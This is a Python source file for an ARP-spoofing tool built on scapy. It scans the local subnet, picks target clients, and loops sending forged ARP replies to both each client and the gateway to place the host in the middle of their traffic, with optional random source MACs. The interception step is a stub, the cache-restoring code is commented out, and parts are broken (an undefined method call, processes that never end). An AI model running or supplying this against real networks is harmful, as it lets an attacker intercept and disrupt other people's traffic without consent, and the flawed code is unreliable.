import random
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, ICMP
import netifaces
import time
from logging import getLogger
from multiprocessing import Process

logger = getLogger(__name__)


class ARPSpoofer:

    def __init__(self):
        self.interface = None
        gateways = netifaces.gateways()
        if "default" in gateways and netifaces.AF_INET in gateways["default"]:
            self.interface = gateways["default"][netifaces.AF_INET][1]

        self.gateway_ip = None
        gateways = netifaces.gateways()
        if "default" in gateways and netifaces.AF_INET in gateways["default"]:
            self.gateway_ip = gateways["default"][netifaces.AF_INET][0]

        self.gateway_mac = None
        packet = ARP(pdst=self.gateway_ip)
        response = sr1(packet, timeout=3, verbose=False)
        if response is not None:
            self.gateway_mac = response.hwsrc
        else:
            raise ScapyNoDstMacException

        self.subnet_mask = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]["netmask"]
        self.host_ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]["addr"]
        self.host_mac = netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]["addr"]

        self.mac_resolver = {}
        with open("oui.txt", "r", encoding="utf-8") as oui:
            text = oui.readlines()
            text = "\n".join(text)
            resolver_data = text.split("\n\n\n")  # Remove empty lines
            for one_resolver_data in resolver_data:
                line = one_resolver_data.split("\n")[1]
                mac = line.split("   ")[0]
                address = line.split("\t")[-1]
                self.mac_resolver[mac] = address

        self.spoofed_clients = []
        self.spoofer_proc = None
        self.mitm_proc = None

    def scan_network(self, scanning_method):
        if scanning_method == "arp":
            host_bits = self.get_host_bits(self.subnet_mask)

            octets = self.subnet_mask.split(".")
            binary_mask = "".join([bin(int(octet))[2:].zfill(8) for octet in octets])
            host_bits = 0
            for bit in binary_mask:
                if bit == "1":
                    host_bits += 1
                else:
                    break

            network_ip = self.gateway_ip + "/" + str(host_bits)
            logger.debug(f"Running scan on network address: {network_ip}")

            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_ip)

            result = srp(arp_request, timeout=3, verbose=False)[0]
            arp_responses = []

            for sent, received in result:
                # try:
                #     hostname = socket.gethostbyaddr(received.psrc)[0]
                # except socket.herror:
                #     hostname = "Unknown"
                arp_responses.append(
                    {
                        "IP": received.psrc,
                        "MAC": received.hwsrc,
                        # 'Hostname': hostname
                    }
                )

            sorted_data = sorted(arp_responses, key=lambda x: x["MAC"])

            logger.debug("IP\t\tMAC\t\t\tDEVICE")
            for client in sorted_data:
                try:
                    mac_resolved = self.mac_resolver[
                        client["MAC"][:8].replace(":", "-").upper()
                    ]
                except Exception as e:
                    mac_resolved = ""
                logger.debug(f'{client["IP"]}\t{client["MAC"]}\t{mac_resolved}')
        elif scanning_method == 'nmap':
            pass

    def spoof_client(self, client_ip, attack_type, spoof_source=False):
        if not self.is_client_present(client_ip):
            raise Scapy_Exception(f"Client IP {client_ip} not present on network")

        packet = ARP(pdst=client_ip)
        response = sr1(packet, timeout=3, verbose=False)
        if response is not None:
            mac = response.hwsrc
            self.spoofed_clients.append(
                {"original_IP": client_ip, "original_MAC": mac, "attack_type": attack_type}
            )
            logger.debug("Client added to spoofed_clients list")
        else:
            raise ScapyNoDstMacException

    def spoofing_func(self, spoof_source=False):
        logger.debug("Spoofing these clients", self.spoofed_clients)
        while True:
            for client in self.spoofed_clients:
                packets = self._create_spoofed_packets(client['original_IP'], client['original_MAC'], spoof_source)
                logger.debug("Sending packets for spoofing MAC")

                [sendp(x, verbose=False) for x in packets]
            time.sleep(0.1)
    
    def mitm_func(self):
        while True:
            print("Mitm will be implemented here")
            time.sleep(0.1)

    def start_spoofing_process(self):
        self.spoofer_proc = Process(target=self.spoofing_func)
        self.mitm_proc = Process(target=self.mitm_func)
        self.spoofer_proc.start()
        self.mitm_proc.start()
        logger.debug("Started spoofing process")

    def stop_spoofing_process(self):
        if self.spoofer_proc != None:
            self.spoofer_proc.join()
            self.mitm_proc.join()
            self.spoofer_proc = None
            self.mitm_proc = None
        else:
            raise Scapy_Exception(f"Spoofing process not active")
        logger.debug("Stopped the spoofing process")

    def remove_spoof_client(self, client_ip):
        for client in self.spoofed_clients:
            if client['original_IP'] == client_ip:
                self.spoofed_clients.remove(client)
                if not self.is_client_present(client['IP']):
                    raise Scapy_Exception(f'Client with IP {client['IP']} not present in network')
                break
        logger.debug("Client removed from spoofing clients list")


    def is_client_present(self, client_ip):
        try_count = 0
        while try_count < 5:
            icmp_packet = (
                IP(
                    dst=client_ip,
                )
                / ICMP()
            )

            response = sr1(icmp_packet, timeout=2, verbose=False)
            if response is not None:
                return True
            try_count += 1
        return False


    # def report_net_status(self):
    #     return {
    #         "gateway_ip": self.gateway_ip,
    #         "gateway_mac": self.gateway_mac,
    #         "interface": self.interface,
    #         "subnet_mask": self.subnet_mask,
    #         "host_ip": self.host_ip,
    #         "host_mac": self.host_mac,
    #         # 'scanned_hosts': self.scan_network()
    #     }

    def _create_spoofed_packets(self, client_ip, client_mac, spoof_source):
        logger.debug("Creating packets for spoofing")

        host_mac = self.host_mac
        if spoof_source:
            host_mac = self.generate_random_mac()

        packets = []
        client_packet = Ether(dst=client_mac, src=host_mac) / ARP(
            pdst=client_ip, psrc=self.gateway_ip
        )
        gateway_packet = Ether(dst=self.gateway_mac, src=host_mac) / ARP(
            pdst=self.gateway_ip, psrc=client_ip
        )

        packets.append(client_packet)
        packets.append(gateway_packet)

        logger.debug(f"Packets generated: {packets}")

        return packets

    # def _create_original_packets(self, client_ip, client_mac):
    #     logger.debug("Creating packets for restoring original IP-MAC")

    #     gateway_ip = self.gateway_ip
    #     gateway_mac = self.gateway_mac

    #     packets = []
    #     client_packet = Ether(dst=ETHER_BROADCAST, src=client_mac) / ARP(
    #         pdst=client_ip, psrc=gateway_ip
    #     )
    #     gateway_packet = Ether(dst=ETHER_BROADCAST, src=gateway_mac) / ARP(
    #         pdst=gateway_ip, psrc=client_ip
    #     )

    #     packets.append(client_packet)
    #     packets.append(gateway_packet)

    #     logger.debug(f"Packets generated: {packets}")

    #     return packets

    def generate_random_mac(self):
        mac = [random.randint(0x00, 0xFF) for _ in range(6)]
        mac[0] &= 0xFE  # Ensure the MAC address is unicast and not multicast
        return ":".join(map(lambda x: "%02x" % x, mac))





# packets = self._create_original_packets(client['IP'],client['MAC'])
# [sendp(x, verbose=False) for x in packets]